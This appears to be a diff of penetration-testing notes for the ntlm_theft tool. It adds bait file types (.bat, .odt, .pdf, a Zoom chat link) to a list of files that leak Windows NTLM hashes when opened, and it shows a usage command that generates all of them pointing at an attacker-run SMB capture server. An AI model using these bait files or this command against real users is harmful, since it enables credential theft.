@@ -154,7 +154,7 @@ Browse to Folder Containing
 .scf – via ICONFILE field (Not Working on Latest Windows)
 autorun.inf via OPEN field (Not Working on Latest Windows)
 desktop.ini - via IconResource field (Not Working on Latest Windows)
-
+.bat – Windows command script
 Open Document
 .xml – via Microsoft Word external stylesheet
 .xml – via Microsoft Word includepicture field
@@ -168,6 +168,11 @@ Open Document
 .m3u – via Windows Media Player playlist (Worse, Win10 opens first in Groovy)
 .jnlp – via Java external jar
 .application – via any Browser (Must be served via a browser downloaded or won’t run)
+.odt – OpenDocument Text
+Open Document and Accept Popup
+.pdf – via Adobe Acrobat Reader
+Click Link in Chat Program
+.txt – formatted link to paste into Zoom chat
 
 python3 ntlm_theft.py -g all -s 192.168.45.172(The IP address of your SMB hash capture server) -f contracts
 ```
